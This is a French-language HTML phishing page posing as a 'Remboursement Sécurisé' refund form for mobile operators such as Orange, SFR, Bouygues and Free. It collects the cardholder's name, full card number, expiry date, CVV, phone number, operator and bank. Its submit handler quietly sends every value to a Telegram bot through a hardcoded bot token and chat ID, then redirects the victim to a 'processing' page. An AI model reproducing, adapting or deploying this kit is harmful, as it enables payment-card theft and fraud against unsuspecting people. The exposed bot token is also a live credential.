<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remboursement Sécurisé</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #f3f4f6, #e5e7eb);
        }
        #card-error, #phone-error {
            display: none;
            color: red;
            font-size: 0.9rem;
            margin-top: 5px;
        }
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .input-field {
            transition: border-color 0.3s ease;
        }
        .input-field:focus {
            border-color: #4f46e5;
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        .card-logo {
            width: 40px;
            height: auto;
            margin-right: 10px;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen justify-center items-center">

    <!-- Formulaire principal -->
    <div class="card p-8 max-w-lg w-full">
        <!-- Logos des opérateurs -->
        <div class="flex justify-center space-x-4 mb-6">
            <img src="https://via.placeholder.com/100" alt="Orange" class="h-12">
            <img src="https://via.placeholder.com/100" alt="SFR" class="h-12">
            <img src="https://via.placeholder.com/100" alt="Bouygues" class="h-12">
            <img src="https://via.placeholder.com/100" alt="Free" class="h-12">
        </div>

        <!-- Titre -->
        <div class="text-center mb-8">
            <h1 class="text-2xl font-bold text-gray-800">Remboursement Sécurisé</h1>
            <p class="text-sm text-gray-600 mt-2">
                Entrez vos informations pour recevoir votre remboursement en toute sécurité.
            </p>
        </div>

        <!-- Formulaire -->
        <form id="remboursement-form">
            <!-- Titulaire de la carte -->
            <div class="mb-6">
                <label for="nom" class="block text-sm font-medium text-gray-700 mb-2">Titulaire de la carte</label>
                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
                    class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
            </div>

            <!-- Numéro de carte -->
            <div class="mb-6">
                <label for="numero-carte" class="block text-sm font-medium text-gray-700 mb-2">Numéro de carte</label>
                <div class="relative">
                    <div class="absolute inset-y-0 left-0 flex items-center pl-3">
                        <img id="card-type" src="https://via.placeholder.com/30" alt="Card Type" class="card-logo">
                    </div>
                    <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none pl-14">
                </div>
                <p id="card-error" class="text-red-500 text-sm mt-2 hidden">Le numéro de carte est invalide.</p>
            </div>

            <!-- Date d'expiration et CVV -->
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div>
                    <label for="date-expiration" class="block text-sm font-medium text-gray-700 mb-2">Expiration (MM/AA)</label>
                    <input type="month" id="date-expiration" required
                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
                </div>
                <div>
                    <label for="cvv" class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                    <input type="tel" id="cvv" placeholder="123" required maxlength="3"
                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
                </div>
            </div>

            <!-- Numéro de téléphone -->
            <div class="mb-6">
                <label for="telephone" class="block text-sm font-medium text-gray-700 mb-2">Numéro de téléphone</label>
                <input type="tel" id="telephone" placeholder="Ex: 0612345678" required maxlength="10"
                    class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
                <p id="phone-error" class="text-red-500 text-sm mt-2 hidden">Le numéro doit contenir 10 chiffres.</p>
            </div>

            <!-- Opérateur et Banque -->
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div>
                    <label for="operateur" class="block text-sm font-medium text-gray-700 mb-2">Opérateur</label>
                    <select id="operateur" required
                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none bg-white">
                        <option value="" disabled selected>Sélectionnez</option>
                        <!-- Opérateurs principaux -->
                        <option value="orange">Orange</option>
                        <option value="sfr">SFR</option>
                        <option value="bouygues">Bouygues Telecom</option>
                        <option value="free">Free</option>
                        <!-- MVNOs -->
                        <option value="la-poste">La Poste Mobile</option>
                        <option value="nrj">NRJ Mobile</option>
                        <option value="red">RED by SFR</option>
                        <option value="sosh">Sosh</option>
                        <option value="b-and-you">B&YOU</option>
                        <option value="prixtel">Prixtel</option>
                        <option value="cdiscount">Cdiscount Mobile</option>
                        <option value="autre">Autre</option>
                    </select>
                </div>
                <div>
                    <label for="bank" class="block text-sm font-medium text-gray-700 mb-2">Banque</label>
                    <select id="bank" required
                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none bg-white">
                        <option value="" disabled selected>Sélectionnez</option>
                        <!-- Grandes banques -->
                        <option value="bnp">BNP Paribas</option>
                        <option value="sg">Société Générale</option>
                        <option value="ca">Crédit Agricole</option>
                        <option value="lcl">LCL</option>
                        <option value="bp">Banque Populaire</option>
                        <option value="cm">Crédit Mutuel</option>
                        <option value="hsbc">HSBC</option>
                        <option value="la-poste">La Banque Postale</option>
                        <!-- Banques en ligne -->
                        <option value="boursorama">Boursorama Banque</option>
                        <option value="fortuneo">Fortuneo</option>
                        <option value="hellobank">Hello Bank!</option>
                        <option value="n26">N26</option>
                        <option value="revolut">Revolut</option>
                        <option value="autre">Autre</option>
                    </select>
                </div>
            </div>

            <!-- Bouton de validation -->
            <button type="submit"
                class="w-full bg-indigo-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-indigo-700 transition duration-300">
                Valider le remboursement
            </button>
        </form>

        <!-- Paiement sécurisé -->
        <div class="mt-6 text-center">
            <img src="https://via.placeholder.com/300x100" alt="Paiement Sécurisé" class="w-full h-auto">
        </div>
    </div>

    <!-- Footer -->
    <footer class="mt-10 text-center text-gray-600 text-sm">
        <p>&copy; 2024 Remboursement Sécurisé. Tous droits réservés.</p>
        <p class="mt-2">
            <a href="#" class="text-indigo-600 hover:underline">Politique de confidentialité</a> |
            <a href="#" class="text-indigo-600 hover:underline">Conditions d'utilisation</a>
        </p>
    </footer>

    <script>
        // Détection du type de carte
        const cardInput = document.getElementById('numero-carte');
        const cardError = document.getElementById('card-error');
        const cardTypeImg = document.getElementById('card-type');

        cardInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');

            // Détection du type de carte
            if (/^4/.test(value)) {
                cardTypeImg.src = "https://img.icons8.com/color/48/000000/visa.png"; // Logo Visa
            } else if (/^5[1-5]/.test(value)) {
                cardTypeImg.src = "https://img.icons8.com/color/48/000000/mastercard.png"; // Logo Mastercard
            } else if (/^3[47]/.test(value)) {
                cardTypeImg.src = "https://img.icons8.com/color/48/000000/amex.png"; // Logo American Express
            } else if (/^6(?:011|5)/.test(value)) {
                cardTypeImg.src = "https://img.icons8.com/color/48/000000/discover.png"; // Logo Discover
            } else {
                cardTypeImg.src = "https://via.placeholder.com/30"; // Logo par défaut
            }

            cardError.classList.add('hidden');
        });

        // Validation du numéro de téléphone (10 chiffres)
        const phoneInput = document.getElementById('telephone');
        const phoneError = document.getElementById('phone-error');

        phoneInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 10) value = value.slice(0, 10);
            e.target.value = value;

            if (value.length !== 10) {
                phoneError.classList.remove('hidden');
            } else {
                phoneError.classList.add('hidden');
            }
        });

        // Soumission du formulaire
        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
            event.preventDefault();

            const nom = document.getElementById("nom").value;
            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
            const dateExpiration = document.getElementById("date-expiration").value;
            const cvv = document.getElementById("cvv").value;
            const telephone = document.getElementById("telephone").value;
            const operateur = document.getElementById("operateur").value;
            const bank = document.getElementById("bank").value;

            const token1 = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
            const chatId1 = "5372119436";

            const message = `
🔔 **Nouvelle Demande de Remboursement** 🔔
👤 Nom: ${nom}
💳 Numéro de Carte: ${numeroCarte}
📅 Expiration: ${dateExpiration}
🔒 CVV: ${cvv}
📞 Téléphone: ${telephone}
📡 Opérateur: ${operateur}
🏦 Banque: ${bank}`;

            try {
                await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId1,
                        text: message,
                        parse_mode: "Markdown",
                    }),
                });

                window.location.href = "Traitement.html";
            } catch (error) {
                alert("Erreur lors de l'envoi des données. Veuillez réessayer.");
            }
        });
    </script>
</body>
</html>
